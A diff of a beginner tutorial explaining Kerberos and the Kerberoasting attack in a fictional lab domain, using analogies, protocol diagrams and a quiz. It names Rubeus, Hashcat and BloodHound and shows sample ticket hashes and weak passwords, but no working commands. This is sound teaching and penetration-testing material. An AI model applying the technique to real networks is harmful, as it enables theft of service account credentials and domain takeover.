@@ -45,213 +45,395 @@
 
 # PART 0: The God-Level Explanation of Kerberos {#part-0-fundamentals}
 
-**Read this section carefully. Every concept is explained completely.**
+> **🎓 WHY THIS SECTION EXISTS:**
+>
+> Most tutorials tell you: "Run Rubeus, get hashes, crack them, done."
+> 
+> But you're left confused:
+> - What exactly IS Kerberos? Is it a server? Software? A protocol?
+> - Where does the KDC "live"? In the cloud? On-premise?
+> - What are these "tickets" everyone talks about?
+> - Why can ANY user request a ticket for ANY service?
+> - How does cracking even work on encrypted data?
+>
+> **This section answers EVERYTHING from absolute zero.**
+> **No assumptions. No jargon without explanation.**
 
 ---
 
-## 0.1: What is Kerberos? (The Absolute Basics)
+## 0.1: What is Kerberos? (Like You're Explaining to Your Mom)
 
-**Kerberos is an AUTHENTICATION PROTOCOL.**
+Let's start with the absolute basics.
 
-Let me break that down:
+**First, what does "authentication" mean?**
 
-- **Authentication** = Proving who you are (like showing your ID card)
-- **Protocol** = A set of rules for communication (like a language)
+Imagine you go to a bank. Before they give you money, they ask: "Who are you?"
+You show your ID card. They verify it. Now they know you are who you claim to be.
 
-So Kerberos is a set of rules that Windows computers use to prove who users and services are.
+Authentication = **Proving your identity**
+
+---
+
+**So what is Kerberos?**
+
+Kerberos is a **set of rules** (we call it a "protocol") that Windows computers follow to prove who you are.
+
+Think of it like this:
+- **English** is a protocol for humans to communicate
+- **HTTP** is a protocol for websites to send data
+- **Kerberos** is a protocol for Windows to authenticate users
 
 **Kerberos is NOT:**
-- A server you can see or touch
-- A cloud service
-- A separate program you install
-- Something from Microsoft Azure
+- ❌ A server you can touch or see
+- ❌ A cloud service like Gmail
+- ❌ A separate software you install
+- ❌ Something only in Azure or AWS
 
 **Kerberos IS:**
-- A protocol (set of rules)
-- Built into Windows since Windows 2000
-- The DEFAULT authentication method in Active Directory
-- Invented at MIT in 1988 (named after the 3-headed dog from Greek mythology)
+- ✅ A protocol (set of rules)
+- ✅ Built into Windows since Windows 2000
+- ✅ The DEFAULT way Active Directory authenticates
+- ✅ Named after Cerberus, the 3-headed dog from Greek mythology (because it has 3 parts: client, server, KDC)
 
 ---
 
-## 0.2: What is the KDC? Where Does It Live?
+## 0.2: Where Does Kerberos "Live"? (The Domain Controller Confusion)
 
-**KDC = Key Distribution Center**
+This confuses EVERYONE at first. Let me clear it up completely.
 
-This is the most confusing part for beginners. Let me explain clearly:
-
-**The KDC is a SERVICE that runs on the Domain Controller.**
+**Think of your company's Active Directory like this:**
 
 ```
-VISUAL EXPLANATION:
+YOUR COMPANY NETWORK:
 ────────────────────────────────────────────────────────────────
 
-YOUR DOMAIN CONTROLLER (DC01):
 ┌─────────────────────────────────────────────────────────────┐
 │                                                              │
-│   WINDOWS SERVER 2019/2022                                  │
-│   (This is a physical or virtual machine)                   │
+│                   DOMAIN CONTROLLER (DC01)                   │
+│                   IP: 192.168.100.10                        │
+│                                                              │
+│   This is just a Windows Server computer sitting in your    │
+│   server room or data center (or maybe in AWS/Azure VM)     │
 │                                                              │
 │   ┌───────────────────────────────────────────────────────┐ │
 │   │                                                        │ │
-│   │   ACTIVE DIRECTORY DOMAIN SERVICES (AD DS)            │ │
-│   │   (This is a Windows "Role" you install)              │ │
+│   │  When you install "Active Directory" on this server,  │ │
+│   │  Windows automatically starts several SERVICES:        │ │
 │   │                                                        │ │
-│   │   Inside AD DS, several SERVICES run:                 │ │
+│   │  ┌──────────────────────────────────────────────────┐ │ │
+│   │  │  📌 KDC (Key Distribution Center)                │ │ │
+│   │  │     - This issues Kerberos tickets               │ │ │
+│   │  │     - Listens on port 88 (TCP/UDP)               │ │ │
+│   │  │     - This is what we're attacking!              │ │ │
+│   │  └──────────────────────────────────────────────────┘ │ │
 │   │                                                        │ │
-│   │   ┌─────────────────────────────────────────────────┐ │ │
-│   │   │                                                  │ │ │
-│   │   │   KDC (Key Distribution Center)                 │ │ │
-│   │   │   ─────────────────────────────                 │ │ │
-│   │   │   This issues Kerberos tickets.                 │ │ │
-│   │   │                                                  │ │ │
-│   │   │   It has two parts:                             │ │ │
-│   │   │   • AS (Authentication Service)                 │ │ │
-│   │   │   • TGS (Ticket Granting Service)               │ │ │
-│   │   │                                                  │ │ │
-│   │   └─────────────────────────────────────────────────┘ │ │
+│   │  ┌──────────────────────────────────────────────────┐ │ │
+│   │  │  📌 LDAP (Lightweight Directory Access Protocol) │ │ │
+│   │  │     - For querying user/group information        │ │ │
+│   │  │     - Port 389/636                               │ │ │
+│   │  └──────────────────────────────────────────────────┘ │ │
 │   │                                                        │ │
-│   │   ┌─────────────────────────────────────────────────┐ │ │
-│   │   │   LDAP Service (directory queries)               │ │ │
-│   │   └─────────────────────────────────────────────────┘ │ │
-│   │                                                        │ │
-│   │   ┌─────────────────────────────────────────────────┐ │ │
-│   │   │   DNS Service (name resolution)                  │ │ │
-│   │   └─────────────────────────────────────────────────┘ │ │
+│   │  ┌──────────────────────────────────────────────────┐ │ │
+│   │  │  📌 DNS Service                                   │ │ │
+│   │  │     - Resolves names like dc01.orsubank.local    │ │ │
+│   │  │     - Port 53                                    │ │ │
+│   │  └──────────────────────────────────────────────────┘ │ │
 │   │                                                        │ │
 │   └───────────────────────────────────────────────────────┘ │
 │                                                              │
 │   ┌───────────────────────────────────────────────────────┐ │
-│   │   NTDS.DIT (The AD Database)                          │ │
-│   │   Contains: All users, passwords (hashed), groups     │ │
+│   │  💾 NTDS.DIT (Active Directory Database)             │ │
+│   │     - This file contains ALL the data:               │ │
+│   │       • User accounts and password hashes            │ │
+│   │       • Group memberships                            │ │
+│   │       • Computer accounts                            │ │
+│   │       • Stored in: C:\Windows\NTDS\ntds.dit          │ │
 │   └───────────────────────────────────────────────────────┘ │
 │                                                              │
 └─────────────────────────────────────────────────────────────┘
 ```
 
-**Key Points:**
-1. The KDC is SOFTWARE (a Windows service)
-2. It runs on the Domain Controller
-3. It is PART of Active Directory
-4. Every Domain Controller runs a KDC
-5. It listens on port 88 (TCP/UDP)
+**Key Understanding:**
 
-**The KDC is NOT in the cloud (unless your DC is in Azure/AWS).**
+1. **Domain Controller = A Windows Server computer** (physical or virtual)
+2. **KDC = A service/program RUNNING on that server**
+3. **KDC is part of Active Directory** - when you install AD, the KDC starts automatically
+4. **Location:** Wherever your DC is - server room, data center, AWS, Azure
 
-For on-premise Active Directory:
-- KDC runs on your physical/virtual Domain Controller
-- It's in your server room or data center
+**Real-world analogy:**
+- Domain Controller = Your college building
+- KDC = The exam hall inside that building
+- LDAP = The student records office inside that building
+- DNS = The reception desk inside that building
 
-For Azure AD / Azure AD DS:
-- Microsoft runs the KDC for you
-- You don't manage it directly
+They're all in the same building, but serve different purposes!
 
 ---
 
-## 0.3: What is a "Ticket"? (This is Critical to Understand)
+## 0.3: What is a "Ticket"? (The Movie Theater Analogy)
 
-**A ticket is a piece of encrypted data that proves your identity.**
+This is THE most important concept. Once you understand tickets, everything else makes sense.
 
-Let me explain with a real-world comparison:
+**Let's use a real-world story:**
 
 ```
-REAL WORLD: MOVIE TICKETS
+🎬 THE MOVIE THEATER STORY:
 ────────────────────────────────────────────────────────────────
 
-1. You go to the ticket counter (like the KDC)
-2. You pay money (prove identity with password)
-3. You get a MOVIE TICKET
-4. You show the ticket to enter the theater
-5. The ticket proves you paid - you don't pay again
+SCENARIO: You want to watch 3 movies at a multiplex
 
-KERBEROS: AUTHENTICATION TICKETS
-────────────────────────────────────────────────────────────────
-
-1. When you log in, your computer contacts the KDC
-2. You prove identity (password hash)
-3. KDC gives you a TICKET (encrypted data blob)
-4. You show the ticket to access services (file shares, SQL, etc.)
-5. The ticket proves who you are - no password needed again!
-```
-
-**Why Use Tickets Instead of Passwords?**
-
-| Method | Security | Speed |
-|--------|----------|-------|
-| Send password every time | BAD - can be intercepted | Slow - verify each time |
-| Send password hash | BAD - can be replayed | Slow |
-| Use tickets | GOOD - encrypted, time-limited | Fast - no verification needed |
-
-**What Does a Ticket Actually Look Like?**
-
-A Kerberos ticket is a blob of ENCRYPTED data. You can't read it - only the intended recipient can decrypt it.
-
-```
-EXAMPLE TICKET (simplified):
-────────────────────────────────────────────────────────────────
-
-ENCRYPTED with service's password hash:
-{
-    "username": "vamsi.krishna",
-    "domain": "ORSUBANK.LOCAL", 
-    "groups": ["Domain Users", "IT_Team"],
-    "valid_from": "2024-12-28 10:00:00",
-    "valid_until": "2024-12-28 20:00:00",
-    "session_key": "random-encryption-key-for-this-session"
-}
-
-ACTUAL APPEARANCE:
-$krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql:1433*$a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0...
-
-(This is just encrypted garbage to anyone who doesn't have the right key)
-```
-
----
-
-## 0.4: Types of Tickets - TGT vs TGS
-
-**There are TWO types of tickets in Kerberos:**
-
-| Ticket Type | Full Name | What It Does | Who Can Decrypt It |
-|-------------|-----------|--------------|-------------------|
-| **TGT** | Ticket Granting Ticket | Proves you logged in | Only the KDC (encrypted with krbtgt hash) |
-| **TGS** | Ticket Granting Service | Proves you can access a specific service | Only that service (encrypted with service's hash) |
-
-**The Flow:**
-
-```
-KERBEROS TICKET FLOW:
-────────────────────────────────────────────────────────────────
-
-STEP 1: Login - Get TGT
-────────────────────────
-You: "I'm vamsi, here's proof I know my password"
-KDC: "OK, here's a TGT - it's valid for 10 hours"
-
-The TGT is like a "day pass" to the domain.
-You show it to get service tickets.
-
-STEP 2: Access Service - Get TGS
+❌ BAD WAY (What we DON'T want):
 ────────────────────────────────
-You: "I have this TGT, I want to access SQL server"
-KDC: "OK, here's a TGS (service ticket) for SQL"
+1. Go to Movie 1 → Pay ₹200 → Show ID → Watch movie
+2. Go to Movie 2 → Pay ₹200 → Show ID → Watch movie  
+3. Go to Movie 3 → Pay ₹200 → Show ID → Watch movie
 
-The TGS is like a "ticket for a specific ride".
-You show it to the SQL server to get access.
+Problems:
+- You pay EVERY time
+- You show ID EVERY time  
+- Cashier verifies you EVERY time
+- Slow, inefficient, risky (what if you lose your ID?)
 
-STEP 3: Use the Service
-───────────────────────
-You: "SQL Server, here's my ticket"
-SQL: "Let me decrypt this... yes, you're vamsi.krishna, access granted!"
+✅ BETTER WAY (Ticket-based):
+──────────────────────────────
+1. Morning: Go to ticket counter
+   - Show ID ONCE
+   - Pay ONCE
+   - Get 3 TICKETS (one for each movie)
+
+2. Throughout the day:
+   - Movie 1: Show ticket → Enter (no ID needed!)
+   - Movie 2: Show ticket → Enter (no payment needed!)
+   - Movie 3: Show ticket → Enter (no verification needed!)
+
+Benefits:
+✅ Prove identity ONCE at the start
+✅ Use tickets rest of the day
+✅ Fast, efficient, secure
 ```
+
+**Now let's map this to Kerberos:**
+
+| Movie Theater | Kerberos/Windows | What It Means |
+|---------------|------------------|---------------|
+| You | Your username (vamsi.krishna) | The person trying to access things |
+| Ticket Counter | KDC (on Domain Controller) | Where you prove your identity |
+| Your ID Card | Your password | Proves who you are |
+| Daily Pass Ticket | **TGT (Ticket Granting Ticket)** | Proves you logged in today |
+| Movie Tickets | **TGS (Ticket Granting Service)** | Proves you can access specific things |
+| Movies (1,2,3) | Services (File Server, SQL, Printer) | Things you want to access |
 
 ---
 
-## 0.5: What is an SPN? (Service Principal Name)
+## 0.4: The Two Types of Tickets (Explained Simply)
 
-**SPN = The "address" of a Kerberos-enabled service**
+Kerberos uses TWO types of tickets. This confuses everyone, so pay attention:
 
-When you want to access SQL Server, you need to tell the KDC WHICH SQL Server. The SPN is how you identify it.
+```
+KERBEROS TICKET TYPES:
+────────────────────────────────────────────────────────────────
+
+TYPE 1: TGT (Ticket Granting Ticket)
+─────────────────────────────────────
+Real World: Your college ID card
+In Kerberos: Proves you logged into the domain
+
+When you get it: When you first log into Windows
+How long it lasts: Usually 10 hours (then you need to refresh)
+Who can decrypt it: Only the KDC (encrypted with KRBTGT account's password)
+
+What it looks like:
+┌──────────────────────────────────────────┐
+│  🎫 TGT - Ticket Granting Ticket         │
+├──────────────────────────────────────────┤
+│  User: vamsi.krishna                     │
+│  Domain: ORSUBANK.LOCAL                  │
+│  Valid From: 9:00 AM                     │
+│  Valid Until: 7:00 PM (10 hours)         │
+│  Session Key: [random encryption key]    │
+│                                          │
+│  🔒 ENCRYPTED with KRBTGT's password    │
+│  (Only KDC can decrypt this!)            │
+└──────────────────────────────────────────┘
+
+
+TYPE 2: TGS (Ticket Granting Service)
+──────────────────────────────────────
+Real World: Specific tickets (movie ticket, parking ticket)
+In Kerberos: Proves you can access a SPECIFIC service
+
+When you get it: When you want to access a service (file share, SQL, etc.)
+How long it lasts: Usually 10 hours
+Who can decrypt it: Only THAT service (encrypted with service's password!)
+
+What it looks like:
+┌──────────────────────────────────────────┐
+│  🎫 TGS - Service Ticket for SQL Server  │
+├──────────────────────────────────────────┤
+│  User: vamsi.krishna                     │
+│  Service: MSSQLSvc/sql.orsubank.local    │
+│  Valid From: 10:30 AM                    │
+│  Valid Until: 8:30 PM                    │
+│  Session Key: [random key]               │
+│                                          │
+│  🔒 ENCRYPTED with svc_sql's password   │
+│  (Only SQL service can decrypt this!)    │
+└──────────────────────────────────────────┘
+```
+
+**The CRITICAL Difference:**
+- **TGT** = Encrypted with **KRBTGT's** password (only KDC can read it)
+- **TGS** = Encrypted with **SERVICE ACCOUNT's** password (only that service can read it)
+
+👉 **THIS IS THE VULNERABILITY!** If we can get the TGS, we can try to crack the service password!
+
+---
+
+## 0.5: How Kerberos Works - The Complete Flow (Step by Step)
+
+Let me walk you through EXACTLY what happens when you access a file server.
+
+**SCENARIO:** You (vamsi.krishna) want to access `\\fileserver\documents`
+
+```
+THE COMPLETE KERBEROS FLOW:
+────────────────────────────────────────────────────────────────
+
+                  YOU                    KDC (DC01)           FILE SERVER
+              (vamsi.krishna)        (192.168.100.10)     (\\fileserver)
+                    │                       │                     │
+                    │                       │                     │
+═══════════════════════════════════════════════════════════════════════════
+  PHASE 1: MORNING LOGIN - GET YOUR TGT (This happens when you log in)
+═══════════════════════════════════════════════════════════════════════════
+                    │                       │                     │
+    You type your   │                       │                     │
+    password and    │                       │                     │
+    press Enter     │                       │                     │
+                    │                       │                     │
+                    │  1. AS-REQ            │                     │
+                    │  "I'm vamsi.krishna,  │                     │
+                    │   here's my timestamp │                     │
+                    │   encrypted with my   │                     │
+                    │   password hash"      │                     │
+                    │──────────────────────>│                     │
+                    │                       │                     │
+                    │                       │  KDC checks:        │
+                    │                       │  1. Does user exist?│
+                    │                       │  2. Can I decrypt   │
+                    │                       │     the timestamp?  │
+                    │                       │  3. Is time correct?│
+                    │                       │                     │
+                    │  2. AS-REP            │  ✅ All good!       │
+                    │  "Here's your TGT!"   │  Creates TGT        │
+                    │<──────────────────────│                     │
+                    │                       │                     │
+    ✅ Login        │                       │                     │
+    Successful!     │                       │                     │
+    You now have    │                       │                     │
+    a TGT in memory │                       │                     │
+                    │                       │                     │
+                    │                       │                     │
+═══════════════════════════════════════════════════════════════════════════
+  PHASE 2: ACCESSING FILE SERVER - GET SERVICE TICKET (TGS)
+═══════════════════════════════════════════════════════════════════════════
+                    │                       │                     │
+    You double-     │                       │                     │
+    click on        │                       │                     │
+    \\fileserver    │                       │                     │
+                    │                       │                     │
+                    │  3. TGS-REQ           │                     │
+                    │  "I have this TGT,    │                     │
+                    │   now give me ticket  │                     │
+                    │   for CIFS/fileserver"│                     │
+                    │──────────────────────>│                     │
+                    │                       │                     │
+                    │                       │  KDC checks:        │
+                    │                       │  1. Is TGT valid?   │
+                    │                       │  2. Which account   │
+                    │                       │     runs fileserver?│
+                    │                       │  3. Gets that       │
+                    │                       │     account's hash  │
+                    │                       │                     │
+                    │  4. TGS-REP           │  Creates TGS        │
+                    │  "Here's your ticket  │  encrypted with     │
+                    │   for fileserver!"    │  fileserver's       │
+                    │<──────────────────────│  password! 🔥       │
+                    │                       │                     │
+    ✅ Got service  │                       │                     │
+    ticket!         │                       │                     │
+                    │                       │                     │
+                    │                       │                     │
+═══════════════════════════════════════════════════════════════════════════
+  PHASE 3: ACCESS THE FILE SERVER - USE THE TICKET
+═══════════════════════════════════════════════════════════════════════════
+                    │                       │                     │
+                    │  5. AP-REQ            │                     │
+                    │  "Here's my ticket!"  │                     │
+                    │───────────────────────────────────────────>│
+                    │                       │                     │
+                    │                       │      File Server:   │
+                    │                       │      1. Decrypt     │
+                    │                       │         with MY     │
+                    │                       │         password    │
+                    │                       │      2. Check user  │
+                    │                       │         is valid    │
+                    │                       │      3. Grant access│
+                    │                       │                     │
+                    │  6. AP-REP            │                     │
+                    │  "Access granted!"    │                     │
+                    │<───────────────────────────────────────────│
+                    │                       │                     │
+    ✅ You can now  │                       │                     │
+    see the files!  │                       │                     │
+```
+
+**MAGIC MOMENT - Where the Vulnerability Happens:**
+
+Notice in **Step 4** - the KDC encrypts your service ticket with the **fileserver's password**!
+
+The KDC gives YOU this encrypted blob, and you can:
+1. Save it
+2. Take it home
+3. Try to crack it offline
+4. No one knows you're trying!
+
+This is Kerberoasting! 🎯
+
+---
+
+## 0.6: What is an SPN? (The Phone Book Analogy)
+
+**SPN = Service Principal Name**
+
+Think of it as a **phone number in a phone book**, but for services.
+
+**Real-world analogy:**
+
+```
+📞 PHONE BOOK:
+────────────────────────────────────────────────────────────────
+
+Rajesh Kumar - Pizza Shop       → 9876543210
+Priya Singh - Hospital          → 9876543211  
+Amit Patel - Taxi Service       → 9876543212
+
+When you want pizza, you look up "Rajesh - Pizza" and call 9876543210
+```
+
+**In Active Directory:**
+
+```
+📋 SPN "PHONE BOOK":
+────────────────────────────────────────────────────────────────
+
+SQL Server on DC01 port 1433    → MSSQLSvc/DC01.orsubank.local:1433
+Web Server on web.orsubank      → HTTP/web.orsubank.local
+Backup Service on DC01          → backup/dc01.orsubank.local
+File Shares on fileserver       → CIFS/fileserver.orsubank.local
+
+When you want to access SQL, you ask for ticket to "MSSQLSvc/DC01.orsubank.local:1433"
+```
 
 **SPN Format:**
 ```
@@ -259,370 +441,1341 @@ serviceclass/hostname:port
 
 Examples:
 ─────────
-MSSQLSvc/sql01.orsubank.local:1433     → SQL Server on sql01, port 1433
-HTTP/web01.orsubank.local               → Web server on web01
-CIFS/fileserver.orsubank.local          → File shares on fileserver
-LDAP/dc01.orsubank.local                → LDAP on the domain controller
+MSSQLSvc/DC01.orsubank.local:1433    ← SQL Server
+HTTP/web.orsubank.local              ← Web Server  
+backup/dc01.orsubank.local           ← Backup Service
+CIFS/fileserver.orsubank.local       ← File Shares
 ```
 
 **Where are SPNs stored?**
 
-SPNs are stored as an ATTRIBUTE on user or computer accounts in Active Directory.
+SPNs are stored in Active Directory as a PROPERTY on user accounts:
 
 ```
-ACTIVE DIRECTORY:
+USER ACCOUNT: svc_sql
+├── Name: SQL Service Account
+├── Password: SqlSvc@2024!  ← THIS is what encrypts the ticket!
+├── Groups: ServiceAccounts
+└── servicePrincipalName: MSSQLSvc/DC01.orsubank.local:1433  ← SPN
+
+When you request a ticket for "MSSQLSvc/DC01.orsubank.local:1433",
+the KDC:
+1. Looks up: "Which account has this SPN?"
+2. Finds: svc_sql
+3. Gets: svc_sql's password hash
+4. Encrypts ticket with that hash
+5. Gives you the encrypted ticket
+
+👉 YOU can now try to crack svc_sql's password!
+```
+
+---
+
+## 0.7: The Kerberoasting Vulnerability - Explained Like You're 5
+
+Let me explain the vulnerability in the simplest possible way.
+
+**Imagine this conversation:**
+
+```
+👤 YOU (vamsi.krishna): "Hey KDC, I need to access the SQL server"
+
+🏛️ KDC: "Sure! Are you logged in?"
+
+👤 YOU: "Yes, here's my TGT"
+
+🏛️ KDC: "OK, let me create a ticket for SQL server...
+        The SQL server is run by account 'svc_sql'...
+        I'll encrypt this ticket with svc_sql's password...
+        Here you go!"
+        
+        [Hands you encrypted blob]
+
+👤 YOU: "Thanks!"
+
+        [You take the encrypted blob home]
+        
+🏠 AT HOME ON YOUR LAPTOP:
+
+👤 YOU: "Let me try to guess svc_sql's password...
+        
+        Try 'password123' → Decrypt → ❌ Doesn't work
+        Try 'SqlSvc@2024!' → Decrypt → ✅ IT WORKS!
+        
+        I KNOW THE PASSWORD NOW!"
+```
+
+**Why this is a HUGE problem:**
+
+| What Normal People Think | Reality |
+|-------------------------|---------|
+| "Only admins can get service passwords" | ❌ ANY user can request tickets |
+| "There's a password lockout after 5 tries" | ❌ Cracking is OFFLINE, no lockout! |
+| "SQL password must be strong" | ❌ Often weak: SqlSvc@2024! |
+| "We'll detect if someone requests tickets" | ❌ Looks like normal Kerberos traffic! |
+| "Service accounts aren't important" | ❌ Often have Domain Admin rights! |
+
+---
+
+## 0.8: Why Can ANY User Request Tickets? (The Design Decision)
+
+This confuses everyone: "Why does AD let me request tickets for services I don't even use?"
+
+**The design logic:**
+
+```
+MICROSOFT'S THINKING IN 2000:
 ────────────────────────────────────────────────────────────────
 
-USER: svc_sql
-├── sAMAccountName: svc_sql
-├── password: (hashed)
-├── memberOf: SQL_Admins
-└── servicePrincipalName: MSSQLSvc/sql01.orsubank.local:1433  ← SPN!
-
-When KDC gets a request for "MSSQLSvc/sql01.orsubank.local:1433",
-it looks up which account has that SPN, and uses THAT account's
-password hash to encrypt the ticket.
+1. USER PERSPECTIVE:
+   - You might need to access SQL later today
+   - You might need to access File Server
+   - We don't know WHAT you'll need
+   - So we let you request tickets for ANYTHING
+   
+2. SECURITY PERSPECTIVE:
+   - The ticket is ENCRYPTED
+   - Only the service can decrypt it
+   - So giving you an encrypted ticket is "safe"
+   - You can't use it unless you're authorized
+   
+3. ASSUMPTIONS (This is where they went wrong):
+   - Service accounts will have STRONG passwords (120+ chars)
+   - OR they'll be computer accounts (auto-generated passwords)
+   - Offline cracking will be computationally expensive
+   - Network monitoring will catch suspicious requests
 ```
 
-**Why SPNs matter for Kerberoasting:**
-
-1. We request a ticket for an SPN
-2. KDC encrypts it with the service account's password hash
-3. We get that encrypted ticket
-4. We try to crack the password by guessing
-
----
-
-## 0.6: The Kerberoasting Vulnerability - Simple Explanation
-
-**Now you understand:**
-- KDC = Service on Domain Controller that issues tickets
-- Tickets = Encrypted blobs proving identity
-- SPNs = Addresses of services
-
-**The vulnerability:**
+**What actually happened:**
 
 ```
-THE KERBEROASTING ATTACK - SIMPLE VERSION:
+REALITY IN 2024:
 ────────────────────────────────────────────────────────────────
 
-1. ANY domain user can request a TGS for ANY SPN
-
-   You don't need access to SQL to request a ticket for SQL.
-   The KDC just gives it to you!
+1. Admins set weak passwords:
+   ❌ svc_sql: SqlSvc@2024!
+   ❌ svc_backup: Backup@2024!
+   ❌ svc_web: WebServer123!
    
-2. The TGS is encrypted with the SERVICE ACCOUNT's password
-
-   The KDC uses the svc_sql account's password to encrypt it.
+2. GPUs got FAST:
+   ❌ RTX 3090 = 2.5 MILLION password attempts per second
+   ❌ Can crack "SqlSvc@2024!" in minutes
    
-3. You now have an encrypted blob
-
-   You can't read it, but you HAVE it.
+3. Service accounts got over-privileged:
+   ❌ svc_backup is in Domain Admins (why?!)
+   ❌ svc_sql has local admin on 50 servers
    
-4. You can try to CRACK this offline
-
-   You try passwords: "Password123" - does it decrypt? No.
-   You try: "SqlAdmin2019" - does it decrypt? YES!
-   
-   You found the password!
-   
-5. No lockout, unlimited attempts
-
-   This is OFFLINE cracking. The KDC doesn't know.
-   You can try billions of passwords.
+4. Tools made it easy:
+   ❌ Rubeus = One command to get all hashes
+   ❌ Hashcat = Automatic cracking
+   ❌ BloodHound = Shows which accounts are valuable
 ```
 
-**Why this is a huge problem:**
+---
 
-| Problem | Reality |
-|---------|---------|
-| Who can request tickets? | ANY domain user (even guests) |
-| Detection? | Looks like normal Kerberos traffic |
-| Lockout? | NONE - offline cracking |
-| Password quality? | Service accounts often have weak passwords |
-| Privileges? | Service accounts are often over-privileged |
+## 0.9: Where Does This Apply? (Cloud vs On-Premise Confusion)
+
+**Big question:** "I heard my company uses Azure. Can I still Kerberoast?"
+
+Let me clear this up:
+
+```
+DIFFERENT AD SETUPS:
+────────────────────────────────────────────────────────────────
+
+1. ON-PREMISE ACTIVE DIRECTORY (Traditional)
+   ───────────────────────────────────────────
+   Domain Controller: In your office/data center
+   KDC Location: On your DC (192.168.x.x)
+   Kerberoastable: ✅ YES
+   
+   Example: Most companies still use this!
+   
+2. AZURE AD (Pure Cloud)
+   ───────────────────────
+   Domain Controller: None! Microsoft manages it
+   Authentication: OAuth/OIDC (not Kerberos)
+   Kerberoastable: ❌ NO
+   
+   Example: Startups using only Microsoft 365
+   
+3. AZURE AD DOMAIN SERVICES (Managed AD in Cloud)
+   ──────────────────────────────────────────────
+   Domain Controller: Microsoft runs it for you
+   KDC Location: In Azure (managed by Microsoft)
+   Kerberoastable: ✅ YES
+   
+   Example: Companies migrating to cloud
+   
+4. HYBRID (On-Prem + Azure AD)
+   ────────────────────────────
+   Domain Controller: Both! (On-prem syncs to Azure)
+   KDC Location: On your on-prem DC
+   Kerberoastable: ✅ YES (on the on-prem side)
+   
+   Example: Most enterprises during migration
+```
+
+**For ORSUBANK lab:** We're using traditional on-premise AD, so Kerberoasting works perfectly!
 
 ---
 
-## 0.7: On-Premise vs Cloud - Where Does This Apply?
+## 0.10: Quick Self-Test - Do You Understand?
 
-**Kerberoasting applies to TRADITIONAL Active Directory:**
+Before moving forward, test yourself:
 
-| Environment | Kerberoasting Possible? | Why |
-|-------------|------------------------|-----|
-| On-premise AD | YES | KDC runs on your DC |
-| Azure AD only | NO | No KDC, uses OAuth/OIDC |
-| Azure AD DS | YES | Microsoft runs KDC for you |
-| Hybrid (AD + Azure) | YES (on AD side) | On-prem DC has KDC |
-| AWS Managed AD | YES | AWS runs KDC for you |
+```
+QUIZ TIME! (Answer in your head)
+────────────────────────────────────────────────────────────────
 
-**If your organization uses on-premise Active Directory (which most do), Kerberoasting is possible.**
+Q1: What is Kerberos?
+A) A server   B) A protocol   C) A cloud service
+👉 Answer: B - It's a set of rules (protocol)
+
+Q2: Where does the KDC run?
+A) In the cloud   B) On the Domain Controller   C) On your laptop
+👉 Answer: B - It's a service running on the DC
+
+Q3: What does a TGT prove?
+A) You can access SQL   B) You logged in   C) You're an admin
+👉 Answer: B - It proves you authenticated to the domain
+
+Q4: What does a TGS prove?
+A) You can access a specific service   B) You're admin   C) You logged in
+👉 Answer: A - It's a ticket for ONE specific service
+
+Q5: TGS tickets are encrypted with:
+A) Your password   B) KRBTGT password   C) Service account's password
+👉 Answer: C - That's the vulnerability!
+
+Q6: Why can you crack TGS offline?
+A) No lockout policy  B) It's on your computer  C) Both
+👉 Answer: C - You have the encrypted blob, no one knows you're cracking
+
+Q7: Who can request a ticket for SQL server?
+A) Only SQL admins   B) Only Domain Admins   C) ANY domain user
+👉 Answer: C - This is BY DESIGN (and the problem!)
+
+Q8: What is an SPN?
+A) Service password   B) Service address   C) Service account
+👉 Answer: B - It's like a phone number for services
+```
+
+**If you got all 8 correct:** You understand Kerberos! Move to Part 1.
+
+**If you got less than 6:** Re-read this section. The rest won't make sense without this foundation!
 
 ---
 
-## 0.8: Summary - Before Moving On
+## 0.11: Summary - The Attack in 30 Seconds
 
-**Make sure you understand these before continuing:**
+**Here's the entire attack boiled down:**
 
-| Concept | What It Is |
-|---------|-----------|
-| **Kerberos** | Authentication PROTOCOL (set of rules) built into Windows |
-| **KDC** | Service running on Domain Controller that issues tickets |
-| **TGT** | "Day pass" proving you logged in (encrypted with krbtgt) |
-| **TGS** | "Service ticket" for a specific service (encrypted with service password) |
-| **SPN** | Address of a Kerberos service (like MSSQLSvc/sql01:1433) |
-| **Kerberoasting** | Request TGS → Crack the service account password offline |
+```
+KERBEROASTING IN 30 SECONDS:
+────────────────────────────────────────────────────────────────
 
-**If any of this is unclear, re-read this section. Everything else builds on this.**
+1. YOU: "KDC, give me a ticket for SQL server"
+   
+2. KDC: "Here's a ticket encrypted with svc_sql's password"
+   
+3. YOU: [Takes encrypted ticket]
+   
+4. YOU: [Tries millions of passwords on your laptop]
+   
+5. YOU: "Found it! Password is SqlSvc@2024!"
+   
+6. YOU: [Logs in as svc_sql]
+   
+7. IF svc_sql is Domain Admin:
+   👑 GAME OVER - You own the domain!
+```
+
+**Why it works:**
+- ✅ Any user can request tickets (by design)
+- ✅ Tickets encrypted with service password (by design)  
+- ✅ Service passwords often weak (human mistake)
+- ✅ Cracking is offline (no detection)
+- ✅ Service accounts often over-privileged (human mistake)
+
+**This is not a bug - it's a feature we exploit!**
 
 ---
 
 # PART 1: Kerberos Protocol Internals {#part-1-kerberos-internals}
 
-## 1.1: What is Kerberos Really Doing?
+> **🔍 WH AT WE'LL COVER:**  
+>
+> Part 0 gave you the bird's eye view - what Kerberos IS.  
+> Part 1 will show you how it WORKS under the hood.
+>
+> Think of it like this:
+> - Part 0 = Understanding what a car is
+> - Part 1 = Opening the hood and seeing the engine
 
-**Now that you understand the basics, let's go deeper.**
+---
 
-Kerberos is a **ticket-based authentication protocol**. The fundamental principle is:
+## 1.1: What is Kerberos Really Doing? (The Core Principle)
 
-> **You prove your identity ONCE (with your password), then use cryptographic tickets for all subsequent access.**
+Now that you understand the basics, let's go deeper.
 
-**Why this design?**
-1. Your password never travels over the network (after initial auth)
-2. Services can verify you without a central lookup each time
-3. Access can be delegated to other services
-4. Tickets have limited lifetime (security)
+**The fundamental principle of Kerberos:**
 
-## 1.2: The Three Actors
+> You prove your identity ONCE (with your password),  
+> then use cryptographic tickets for EVERYTHING else.
+
+**Let me explain why this is brilliant:**
 
 ```
-KERBEROS ACTORS:
+🏫 IMAGINE A COLLEGE SCENARIO:
 ────────────────────────────────────────────────────────────────
 
-CLIENT                      KDC (Key Distribution Center)         SERVICE
-(User/Computer)             (The Domain Controller)               (SQL, HTTP, etc.)
-                                     │
-                            ┌────────┴────────┐
